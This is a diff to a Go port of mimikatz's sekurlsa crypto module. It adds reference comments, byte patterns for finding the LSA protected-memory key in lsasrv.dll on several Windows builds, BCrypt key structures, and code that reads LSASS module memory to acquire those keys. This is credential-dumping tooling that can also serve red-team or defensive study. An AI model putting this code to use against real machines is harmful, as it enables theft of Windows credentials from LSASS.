@@ -12,6 +12,9 @@ import (
 	"project/internal/module/windows/api"
 )
 
+// reference:
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
+
 var (
 	patternWin7X64LSAInitProtectedMemoryKey = []byte{
 		0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D,
@@ -22,7 +25,7 @@ var (
 	patternWin10X64LSAInitProtectedMemoryKey = []byte{
 		0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D, 0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15,
 	}
-	// key = build
+	// key = build version
 	lsaInitProtectedMemoryKeyReferencesX64 = map[uint32]*patchGeneric{
 		buildWinVista: {
 			search: &patchPattern{
@@ -69,7 +72,7 @@ var (
 
 var (
 	patternWinAllX86LSAInitProtectedMemoryKey = []byte{0x6A, 0x02, 0x6A, 0x10, 0x68}
-	// key = build
+	// key = build version
 	lsaInitProtectedMemoryKeyReferencesX86 = map[uint32]*patchGeneric{
 		buildWin7: {
 			search: &patchPattern{
@@ -106,17 +109,32 @@ var (
 	}
 )
 
+// reference:
+// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.h
+
 type bcryptHandleKey struct {
 	size     uint32
-	tag      uint32  // R U U U
+	tag      uint32  // U U U R
 	hAlg     uintptr // algorithm handle
 	key      uintptr // bcryptKey
 	unknown0 uintptr
 }
 
+type bcryptKey80 struct {
+	size     uint32
+	tag      uint32 // M S S K
+	typ      uint32
+	unknown0 uint32
+	unknown1 uint32
+	unknown2 uint32
+	unknown3 uint32
+	unknown4 uint32
+	hardKey  hardKey
+}
+
 type bcryptKey81 struct {
 	size     uint32
-	tag      uint32 // K S S M
+	tag      uint32 // M S S K
 	typ      uint32
 	unknown0 uint32
 	unknown1 uint32
@@ -140,7 +158,6 @@ type hardKey struct {
 func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
 	kiwi.mu.Lock()
 	defer kiwi.mu.Unlock()
-
 	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
